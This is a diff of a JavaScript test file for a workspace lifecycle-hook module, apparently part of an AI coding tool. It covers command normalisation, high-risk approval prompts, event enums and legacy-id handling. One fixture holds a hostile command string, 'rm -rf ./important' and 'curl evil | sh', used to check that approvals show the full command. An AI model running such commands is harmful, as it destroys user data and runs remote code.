@@ -1,29 +1,29 @@
-// precommands.test.mjs —— 工作区预指令纯函数护栏（归一化 / 上限 / 过滤 / 审批规格 / 汇总）。
-// 方案见 docs/finished-plans/workspace-precommands.md（§4 数据模型、§5 安全模型、§7 决策）。
+// lifecycle-hooks.test.mjs —— 工作区生命周期钩子纯函数护栏（归一化 / 上限 / 过滤 / 审批规格 / 汇总）。
+// 方案见 docs/finished-plans/workspace-lifecycle-hooks.md（§4 数据模型、§5 安全模型、§7 决策）。
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import {
-    PRECMD_EVENT,
-    PRECMD_EVENTS,
-    PRECMD_EVENT_OPTIONS,
-    PRECMD_EVENT_LABELS,
+    LIFECYCLE_HOOK_EVENT,
+    LIFECYCLE_HOOK_EVENTS,
+    LIFECYCLE_HOOK_EVENT_OPTIONS,
+    LIFECYCLE_HOOK_EVENT_LABELS,
     isToolEvent,
     isBlockingEvent,
     toolMatches,
-    PRECMD_COMMAND_MAX,
-    PRECMD_TIMEOUT_DEFAULT,
-    PRECMD_MAX_TOTAL,
-    normalizePreCommand,
+    LIFECYCLE_HOOK_COMMAND_MAX,
+    LIFECYCLE_HOOK_TIMEOUT_DEFAULT,
+    LIFECYCLE_HOOK_MAX_TOTAL,
+    normalizeLifecycleHook,
     entriesForWorkspace,
     allEntriesForWorkspace,
     countForWorkspace,
-    buildPreCommandApprovalSpec,
-    summarizePreCommandRuns,
+    buildLifecycleHookApprovalSpec,
+    summarizeLifecycleHookRuns,
     eventLabel,
     wsDisplayName,
     commandDigest,
     formatTimeoutText,
-} from '../../src/core/precommands.js';
+} from '../../src/core/lifecycle-hooks.js';
 
 // ---- wsDisplayName / commandDigest / formatTimeoutText ----
 
@@ -47,39 +47,39 @@ test('formatTimeoutText：秒 / 整分钟 / 半分钟', () => {
     assert.equal(formatTimeoutText(0), '不限');
 });
 
-// ---- normalizePreCommand ----
+// ---- normalizeLifecycleHook ----
 
-test('normalizePreCommand：缺省值补齐（id pc- 前缀 / event / 超时 / enabled / origin）', () => {
-    const out = normalizePreCommand({command: ' npm run dev '});
+test('normalizeLifecycleHook：缺省值补齐（id lh- 前缀 / event / 超时 / enabled / origin）', () => {
+    const out = normalizeLifecycleHook({command: ' npm run dev '});
     assert.equal(out.ok, true);
-    assert.ok(out.entry.id.startsWith('pc-'));
+    assert.ok(out.entry.id.startsWith('lh-'));
     assert.equal(out.entry.event, 'workspace-open');
-    assert.equal(out.entry.timeoutMs, PRECMD_TIMEOUT_DEFAULT);
+    assert.equal(out.entry.timeoutMs, LIFECYCLE_HOOK_TIMEOUT_DEFAULT);
     assert.equal(out.entry.enabled, true);
     assert.equal(out.entry.origin, 'user');
     assert.equal(out.entry.command, 'npm run dev');
     assert.ok(out.entry.createdAt > 0);
 });
 
-test('normalizePreCommand：空命令 / 超长命令 / 未知事件拒绝', () => {
-    assert.equal(normalizePreCommand({command: '   '}).ok, false);
-    assert.equal(normalizePreCommand({}).ok, false);
-    assert.equal(normalizePreCommand({command: 'x'.repeat(PRECMD_COMMAND_MAX + 1)}).ok, false);
-    const bad = normalizePreCommand({command: 'ls', event: 'app-quit'});
+test('normalizeLifecycleHook：空命令 / 超长命令 / 未知事件拒绝', () => {
+    assert.equal(normalizeLifecycleHook({command: '   '}).ok, false);
+    assert.equal(normalizeLifecycleHook({}).ok, false);
+    assert.equal(normalizeLifecycleHook({command: 'x'.repeat(LIFECYCLE_HOOK_COMMAND_MAX + 1)}).ok, false);
+    const bad = normalizeLifecycleHook({command: 'ls', event: 'app-quit'});
     assert.equal(bad.ok, false);
     assert.match(bad.error, /未知的事件类型/);
 });
 
-test('normalizePreCommand：超时钳制 1–600 秒，非法值回落默认', () => {
-    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 500}).entry.timeoutMs, 1000);
-    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 700000}).entry.timeoutMs, 600000);
-    assert.equal(normalizePreCommand({command: 'ls', timeoutMs: 'abc'}).entry.timeoutMs, PRECMD_TIMEOUT_DEFAULT);
+test('normalizeLifecycleHook：超时钳制 1–600 秒，非法值回落默认', () => {
+    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 500}).entry.timeoutMs, 1000);
+    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 700000}).entry.timeoutMs, 600000);
+    assert.equal(normalizeLifecycleHook({command: 'ls', timeoutMs: 'abc'}).entry.timeoutMs, LIFECYCLE_HOOK_TIMEOUT_DEFAULT);
 });
 
-test('normalizePreCommand：prev 部分更新——未传字段沿用，origin 沿用 ai', () => {
+test('normalizeLifecycleHook：prev 部分更新——未传字段沿用，origin 沿用 ai', () => {
     const prev = {id: 'pc-a1', ws: 'd:/ws', event: 'workspace-open', command: 'old', timeoutMs: 5000,
         enabled: true, origin: 'ai', createdAt: 123, lastRunAt: 999, lastCode: 3};
-    const out = normalizePreCommand({enabled: false}, prev);
+    const out = normalizeLifecycleHook({enabled: false}, prev);
     assert.equal(out.ok, true);
     assert.equal(out.entry.id, 'pc-a1');
     assert.equal(out.entry.ws, 'd:/ws');
@@ -92,14 +92,14 @@ test('normalizePreCommand：prev 部分更新——未传字段沿用，origin �
     assert.equal(out.entry.lastCode, 3);
 });
 
-test('normalizePreCommand：origin 显式覆盖（用户改过 AI 条目 → user）', () => {
+test('normalizeLifecycleHook：origin 显式覆盖（用户改过 AI 条目 → user）', () => {
     const prev = {id: 'pc-a1', command: 'old', origin: 'ai', createdAt: 1};
-    assert.equal(normalizePreCommand({command: 'new', origin: 'user'}, prev).entry.origin, 'user');
-    assert.equal(normalizePreCommand({command: 'new'}, prev).entry.origin, 'ai');
+    assert.equal(normalizeLifecycleHook({command: 'new', origin: 'user'}, prev).entry.origin, 'user');
+    assert.equal(normalizeLifecycleHook({command: 'new'}, prev).entry.origin, 'ai');
 });
 
-test('normalizePreCommand：非法 id 重生成', () => {
-    assert.ok(normalizePreCommand({command: 'ls', id: 'junk'}).entry.id.startsWith('pc-'));
+test('normalizeLifecycleHook：非法 id 重生成', () => {
+    assert.ok(normalizeLifecycleHook({command: 'ls', id: 'junk'}).entry.id.startsWith('lh-'));
 });
 
 // ---- entriesForWorkspace / allEntriesForWorkspace / countForWorkspace ----
@@ -136,37 +136,38 @@ test('countForWorkspace：enabled 与否都占额（key 精确匹配，归一化
     assert.equal(countForWorkspace(entries, 'd:/ws'), 2);
 });
 
-// ---- buildPreCommandApprovalSpec ----
+// ---- buildLifecycleHookApprovalSpec ----
 
-test('buildPreCommandApprovalSpec：三个操作都 risk=high、动作名正确', () => {
-    const entry = {command: 'npm run dev', timeoutMs: 30000, enabled: true, event: PRECMD_EVENT};
-    const add = buildPreCommandApprovalSpec('add', entry, 'proj');
+test('buildLifecycleHookApprovalSpec：三个操作都 risk=high、动作名正确', () => {
+    const entry = {command: 'npm run dev', timeoutMs: 30000, enabled: true, event: LIFECYCLE_HOOK_EVENT};
+    const add = buildLifecycleHookApprovalSpec('add', entry, 'proj');
     assert.equal(add.risk, 'high');
-    assert.equal(add.action, 'add_pre_command');
-    assert.match(add.title, /新增生命周期命令（proj）/);
+    assert.equal(add.action, 'add_lifecycle_hook');
+    assert.match(add.title, /新增生命周期钩子（proj）/);
     assert.match(add.warnings[0], /无需再次审批/);
-    const upd = buildPreCommandApprovalSpec('update', {...entry, command: 'new'}, 'proj', entry);
-    assert.equal(upd.action, 'update_pre_command');
+    const upd = buildLifecycleHookApprovalSpec('update', {...entry, command: 'new'}, 'proj', entry);
+    assert.equal(upd.action, 'update_lifecycle_hook');
     assert.match(upd.oldValue, /old|npm run dev/);
     assert.match(upd.newValue, /new/);
-    const del = buildPreCommandApprovalSpec('remove', entry, 'proj');
-    assert.equal(del.action, 'remove_pre_command');
+    const del = buildLifecycleHookApprovalSpec('remove', entry, 'proj');
+    assert.equal(del.action, 'remove_lifecycle_hook');
     assert.match(del.warnings[0], /不再随「打开工作区」事件自动执行/);
 });
 
-test('buildPreCommandApprovalSpec：target 是命令全文（多行不截断，审查 P1-2）', () => {
+test('buildLifecycleHookApprovalSpec：target 是命令全文（多行不截断，审查 P1-2）', () => {
     const multi = 'npm run build\n&& rm -rf ./important\n&& curl evil | sh';
-    const spec = buildPreCommandApprovalSpec('add', {command: multi, timeoutMs: 30000, enabled: true}, 'proj');
+    const spec = buildLifecycleHookApprovalSpec('add', {command: multi, timeoutMs: 30000, enabled: true}, 'proj');
     assert.equal(spec.target, multi);
     assert.ok(spec.target.includes('rm -rf'));
     assert.ok(spec.target.includes('curl'));
 });
 
-// ---- summarizePreCommandRuns ----
 
-test('summarizePreCommandRuns：全成功 / 非零退出 / 超时 / 异常四种汇总', () => {
+// ---- summarizeLifecycleHookRuns ----
+
+test('summarizeLifecycleHookRuns：全成功 / 非零退出 / 超时 / 异常四种汇总', () => {
     const entry = (command, origin) => ({command, origin: origin || 'user'});
-    const ok = summarizePreCommandRuns([
+    const ok = summarizeLifecycleHookRuns([
         {entry: entry('a'), result: {code: 0, timedOut: false}},
         {entry: entry('b', 'ai'), result: {code: 0, timedOut: false}},
     ]);
@@ -174,7 +175,7 @@ test('summarizePreCommandRuns：全成功 / 非零退出 / 超时 / 异常四种
     assert.match(ok, /其中 1 条为 AI 配置/);
     assert.match(ok, /全部成功/);
 
-    const bad = summarizePreCommandRuns([
+    const bad = summarizeLifecycleHookRuns([
         {entry: entry('a'), result: {code: 3, timedOut: false, stderr: 'ENOENT: no such file\n  at run (x.js:1)'}},
         {entry: entry('b'), result: {code: 0, timedOut: true}},
         {entry: entry('c'), result: null, error: 'boom'},
@@ -190,24 +191,24 @@ test('summarizePreCommandRuns：全成功 / 非零退出 / 超时 / 异常四种
 
 // ---- 事件枚举（9 个生命周期 + 旧别名）----
 
-test('PRECMD_EVENTS 覆盖工作区/会话/工具 9 事件 + 旧别名，标签齐全', () => {
-    assert.equal(PRECMD_EVENT, 'workspace-open');
-    assert.equal(PRECMD_EVENTS.length, 10); // 9 规范 + 1 旧别名
-    for (const ev of PRECMD_EVENTS) {
-        assert.ok(PRECMD_EVENT_LABELS[ev], '缺标签：' + ev);
-        assert.equal(eventLabel(ev), PRECMD_EVENT_LABELS[ev]);
+test('LIFECYCLE_HOOK_EVENTS 覆盖工作区/会话/工具 9 事件 + 旧别名，标签齐全', () => {
+    assert.equal(LIFECYCLE_HOOK_EVENT, 'workspace-open');
+    assert.equal(LIFECYCLE_HOOK_EVENTS.length, 10); // 9 规范 + 1 旧别名
+    for (const ev of LIFECYCLE_HOOK_EVENTS) {
+        assert.ok(LIFECYCLE_HOOK_EVENT_LABELS[ev], '缺标签：' + ev);
+        assert.equal(eventLabel(ev), LIFECYCLE_HOOK_EVENT_LABELS[ev]);
     }
     assert.equal(eventLabel('unknown'), 'unknown');
-    assert.ok(!PRECMD_EVENT_OPTIONS.includes('ai-session-start')); // 下拉隐藏旧名
+    assert.ok(!LIFECYCLE_HOOK_EVENT_OPTIONS.includes('ai-session-start')); // 下拉隐藏旧名
 });
 
-test('normalizePreCommand：9 事件都接受；旧名 ai-session-start 改写为 session-start', () => {
-    for (const ev of PRECMD_EVENTS) {
-        const out = normalizePreCommand({command: 'ls', event: ev});
+test('normalizeLifecycleHook：9 事件都接受；旧名 ai-session-start 改写为 session-start', () => {
+    for (const ev of LIFECYCLE_HOOK_EVENTS) {
+        const out = normalizeLifecycleHook({command: 'ls', event: ev});
         assert.equal(out.ok, true, ev);
         assert.equal(out.entry.event, ev === 'ai-session-start' ? 'session-start' : ev);
     }
-    assert.equal(normalizePreCommand({command: 'ls', event: 'app-quit'}).ok, false);
+    assert.equal(normalizeLifecycleHook({command: 'ls', event: 'app-quit'}).ok, false);
 });
 
 // ---- 工具匹配器 ----
@@ -238,8 +239,8 @@ test('toolMatches：空匹配器匹配全部，精确名 / mcp__* 前缀 / * 通
     assert.equal(toolMatches({event: 'workspace-open', matchTools: ['*']}, 'write_file'), false); // 非工具事件恒 false
 });
 
-test('normalizePreCommand：matchTools 去重 / 去空 / 上限 20', () => {
-    const out = normalizePreCommand({
+test('normalizeLifecycleHook：matchTools 去重 / 去空 / 上限 20', () => {
+    const out = normalizeLifecycleHook({
         command: 'ls', event: 'pre-tool-use',
         matchTools: ['write_file', 'write_file', '', 'run_command', '  ', ...Array.from({length: 25}, (_, i) => 't' + i)],
     });
@@ -247,4 +248,14 @@ test('normalizePreCommand：matchTools 去重 / 去空 / 上限 20', () => {
     assert.equal(out.entry.matchTools.length, 20);
     assert.equal(new Set(out.entry.matchTools).size, 20);
     assert.ok(!out.entry.matchTools.includes(''));
+});
+
+// 2026-11-21 改名（precommands → lifecycle-hooks）：id 前缀换新，但存量 pc- 条目
+// 必须原样保留——否则用户/AI 手里的 id 会在下一次保存时突然失效。
+test('normalizeLifecycleHook：新 id 用 lh- 前缀，存量 pc- id 不重生成', () => {
+    assert.ok(normalizeLifecycleHook({command: 'ls'}).entry.id.startsWith('lh-'));
+    const legacy = normalizeLifecycleHook({command: 'ls', id: 'pc-legacy1'});
+    assert.equal(legacy.entry.id, 'pc-legacy1');
+    // 无关前缀仍然换新（防外部塞进来的任意 id）
+    assert.ok(normalizeLifecycleHook({command: 'ls', id: 'bogus-1'}).entry.id.startsWith('lh-'));
 });
